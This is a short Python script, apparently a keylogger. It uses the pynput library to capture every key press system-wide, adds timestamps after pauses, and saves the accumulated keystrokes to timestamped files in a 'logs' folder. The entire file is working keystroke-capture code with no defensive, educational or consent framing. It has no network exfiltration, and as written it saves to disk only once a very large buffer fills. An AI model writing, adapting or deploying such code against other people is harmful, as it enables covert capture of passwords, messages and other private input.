from pynput import keyboard
from datetime import datetime
import time
from datetime import datetime
from pathlib import Path

now = time.time()
data = '';

def on_press(key):

    global now
    global data
    ecoule = time.time() - now

    if ecoule >= 10:
        # print(f'[###{datetime.now()}###]', flush=True)
        data = data + f'[###{datetime.now()}###]'
    
    now = time.time()

    try:
        # print(key.char, end='', flush=True)
        data = data + key.char
    except AttributeError:
        # print(f'[{key}]', flush=True)
        data = data + f'[{key}]'

    if len(data) > 10000000 :
        write_text_with_datetime(data, directory='logs')
        data = ''

# def on_release(key):


def main() -> None:

    global data

    # print(f'[###{datetime.now()}###]', flush=True)
    data = data + f'[###{datetime.now()}###]'
    with keyboard.Listener(
            on_press=on_press
            # ,on_release=on_release
            ) as listener:
        listener.join()

def write_text_with_datetime(
    content: str,
    directory: str | Path = ".",
    *,
    encoding: str = "utf-8",
    suffix: str = ".txt",
) -> Path:
    if not isinstance(content, str):
        raise TypeError(f"content must be a str, got {type(content).__name__}")

    target_dir = Path(directory)
    target_dir.mkdir(parents=True, exist_ok=True)

    stamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = target_dir / f"{stamp}{suffix}"

    if path.exists():
        micro = datetime.now().strftime("%f")
        path = target_dir / f"{stamp}_{micro}{suffix}"

    path.write_text(content, encoding=encoding)
    return path


if __name__ == "__main__":
    main()